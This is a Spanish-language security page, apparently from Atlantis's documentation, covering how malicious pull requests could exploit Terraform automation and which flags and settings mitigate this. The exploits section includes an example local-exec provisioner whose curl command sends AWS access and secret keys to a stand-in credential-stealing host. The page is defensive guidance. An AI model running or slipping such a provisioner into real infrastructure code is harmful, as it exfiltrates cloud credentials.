# Seguridad

## Exploits

Debido a que normalmente ejecuta Atlantis en un servidor con credenciales que permiten acceso a su infraestructura, es importante que despliegue Atlantis de forma segura.

Atlantis podría ser explotado por

* Un atacante que envía un pull request que contiene un archivo Terraform malicioso que
  usa un provider malicioso o un [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
  sobre el que Atlantis luego ejecuta `terraform plan` (lo cual hace automáticamente a menos que haya desactivado los plans automáticos).
* Ejecutar `terraform apply` sobre un archivo Terraform malicioso con [local-exec](https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec)

    ```tf
    resource "null_resource" "null" {
      provisioner "local-exec" {
        command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
      }
    }
    ```

* Ejecutar comandos de build personalizados maliciosos especificados en un archivo `atlantis.yaml`. Atlantis usa el archivo `atlantis.yaml` de la rama del pull request, **no** `main`.
* Alguien agregando comentarios `atlantis plan/apply` en sus pull requests válidos, causando que terraform se ejecute cuando usted no quiere.

## Mitigaciones

### No usar en repos públicos

Debido a que cualquiera puede comentar en pull requests públicos, incluso con todas las mitigaciones de seguridad disponibles, sigue siendo peligroso ejecutar Atlantis en repos públicos sin una configuración adecuada de los ajustes de seguridad.

### No usar `--allow-fork-prs`

Si está ejecutando en un repo público (lo cual no se recomienda, vea arriba) no debería establecer `--allow-fork-prs` (por defecto es false)
porque cualquiera puede abrir un pull request desde su fork hacia su repo.

### `--repo-allowlist`

Atlantis requiere que especifique una allowlist de repositorios de los que aceptará webhooks mediante la flag `--repo-allowlist`.
Por ejemplo:

* Repositorios específicos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toda su organización: `--repo-allowlist=github.com/runatlantis/*`
* Cada repositorio en su instalación de GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* También puede omitir repos específicos: `--repo-allowlist='github.com/runatlantis/*,!github.com/runatlantis/untrusted-repo'`
* Todos los repositorios: `--repo-allowlist=*`. Útil cuando está en una red protegida, pero peligroso sin también establecer un webhook secret.

Esta flag asegura que su instalación de Atlantis no esté siendo usada con repositorios que usted no controla. Vea `atlantis server --help` para más detalles.

### Proteger Terraform Planning

Si los atacantes que envían pull requests con código Terraform malicioso están en su modelo de amenazas,
entonces debe saber que las aprobaciones de `terraform apply` no son suficientes. Es posible
ejecutar código malicioso en un `terraform plan` usando el [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
o especificando un provider malicioso. Este código podría entonces exfiltrar sus credenciales.

Para prevenir esto, podría:

1. Incorporar providers en la imagen o host de Atlantis y denegar egreso en producción.
1. Implementar internamente el protocolo de registry de providers y denegar egreso público, de esa manera controla quién tiene acceso de escritura al registry.
1. Modificar el paso `plan` de su [configuración de repositorio del lado del servidor](server-side-repo-config.md) para validar contra el
   uso de providers o data sources no permitidos, o pull requests de usuarios no permitidos. También podría agregar validación adicional en este punto, por ejemplo,
   requerir un "thumbs-up" en el PR antes de permitir que `plan` continúe. Conftest podría ser útil aquí.

### `--var-file-allowlist`

Los archivos en su instalación de Atlantis pueden ser accesibles como [archivos de definición de variables](https://developer.hashicorp.com/terraform/language/values/variables#variable-definitions-tfvars-files)
desde pull requests agregando comentarios  
`atlantis plan -- -var-file=/path/to/file`. Para mitigar este riesgo de seguridad, Atlantis ha limitado dicho acceso
solo a los archivos permitidos por la flag `--var-file-allowlist`. Si no se proporciona este argumento, por defecto es
el directorio de datos de Atlantis.

### Webhook Secrets

Atlantis debería ejecutarse con webhook secrets establecidos mediante las variables de entorno `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`.
Incluso con la flag `--repo-allowlist` establecida, sin un webhook secret, los atacantes podrían hacer solicitudes a Atlantis haciéndose pasar por un repositorio que está en la allowlist.
Los webhook secrets aseguran que las solicitudes de webhook realmente provengan de su proveedor de VCS (GitHub o GitLab).

:::tip Tip
Si está usando Azure DevOps, en lugar de webhook secrets agregue un [nombre de usuario y contraseña básicos](#azure-devops-basic-authentication)
:::

### Autenticación básica de Azure DevOps

Azure DevOps admite enviar un encabezado de autenticación básica en todos los eventos de webhook. Esto requiere usar una URL HTTPS para la ubicación de su webhook.

### SSL/HTTPS

Si está usando webhook secrets pero su tráfico va sobre HTTP, entonces los webhook secrets
podrían ser robados. Habilite SSL/HTTPS usando las flags `--ssl-cert-file` y `--ssl-key-file`
.

### Habilitar autenticación en el servidor web de Atlantis

Se recomienda encarecidamente habilitar autenticación en el servicio web. Habilite BasicAuth usando `--web-basic-auth=true` y configure un nombre de usuario y una contraseña usando las flags `--web-username=yourUsername` e `--web-password=yourPassword`.

También puede pasarlas como variables de entorno `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` e `ATLANTIS_WEB_PASSWORD=yourPassword`.

:::tip Tip
Sí fomentamos el uso de contraseñas complejas para prevenir ataques básicos de fuerza bruta.
:::
